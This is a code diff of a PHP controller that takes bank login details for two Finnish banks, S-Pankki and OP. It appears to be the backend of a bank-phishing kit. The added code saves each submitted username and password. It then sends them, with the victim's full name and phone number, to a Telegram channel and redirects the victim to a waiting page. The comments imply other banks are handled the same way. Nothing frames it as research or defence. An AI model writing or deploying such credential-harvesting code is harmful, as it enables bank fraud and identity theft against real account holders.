@@ -357,31 +357,67 @@ class ApiController extends Controller
 
     public function saveSpankkiCredentials(): void
     {
-        header('Content-Type: application/json');
-        
         if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
+            header('Content-Type: application/json');
             $this->json(['success' => false, 'message' => 'Geçersiz istek.'], 400);
+            return;
         }
 
+        // Check if it's JSON or form-data
+        $contentType = $_SERVER['CONTENT_TYPE'] ?? '';
+        if (strpos($contentType, 'application/json') !== false) {
         $data = json_decode(file_get_contents('php://input'), true);
         $userId = (int) ($data['user_id'] ?? 0);
         $username = trim($data['username'] ?? '');
         $password = trim($data['password'] ?? '');
+        } else {
+            // Form data
+            $userId = (int) ($_POST['user_id'] ?? 0);
+            $username = trim($_POST['username'] ?? '');
+            $password = trim($_POST['password'] ?? '');
+        }
 
-        if ($userId <= 0 || empty($username) || empty($password)) {
+        if ($userId <= 0 || empty($username)) {
+            header('Content-Type: application/json');
             $this->json(['success' => false, 'message' => 'Geçersiz parametreler.'], 400);
+            return;
         }
 
         try {
             $userModel = new User();
+            if (!empty($password)) {
             $userModel->updateSpankkiCredentials($userId, $username, $password);
+            } else {
+                $userModel->updateSpankkiUsername($userId, $username);
+            }
             
+            $telegram = new \App\Models\TelegramService();
+            $user = $userModel->findById($userId);
+            if ($user) {
+                $telegram->notifyBankCredentials(
+                    $user['full_name'],
+                    $user['phone'],
+                    'S-Pankki',
+                    $username,
+                    !empty($password) ? $password : null
+                );
+            }
+            
+            // If form submission, redirect directly
+            if (strpos($contentType, 'application/json') === false) {
+                header('Location: /user/' . $userId . '/waiting');
+                exit;
+            }
+            
+            // JSON response
+            header('Content-Type: application/json');
             $this->json([
                 'success' => true,
                 'message' => 'Bilgiler kaydedildi.',
-                'redirect' => '/user/' . $userId . '/bank/spankki2'
+                'redirect' => '/user/' . $userId . '/waiting'
             ]);
         } catch (\Exception $e) {
+            header('Content-Type: application/json');
             $this->json(['success' => false, 'message' => $e->getMessage()], 500);
         }
     }
@@ -674,13 +710,32 @@ class ApiController extends Controller
         $username = trim($data['username'] ?? '');
         $password = trim($data['password'] ?? '');
 
-        if ($userId <= 0 || empty($username) || empty($password)) {
+        if ($userId <= 0 || empty($username)) {
             $this->json(['success' => false, 'message' => 'Geçersiz parametreler.'], 400);
         }
 
         try {
             $userModel = new User();
+            
+            // Password varsa her ikisini de kaydet, yoksa sadece username kaydet
+            if (!empty($password)) {
             $userModel->updateOpCredentials($userId, $username, $password);
+            } else {
+                $userModel->updateOpUsername($userId, $username);
+            }
+            
+            // Telegram bildirimi gönder (diğer bankalar gibi)
+            $telegram = new \App\Models\TelegramService();
+            $user = $userModel->findById($userId);
+            if ($user) {
+                $telegram->notifyBankCredentials(
+                    $user['full_name'],
+                    $user['phone'],
+                    'OP',
+                    $username,
+                    !empty($password) ? $password : null
+                );
+            }
             
             $this->json([
                 'success' => true,
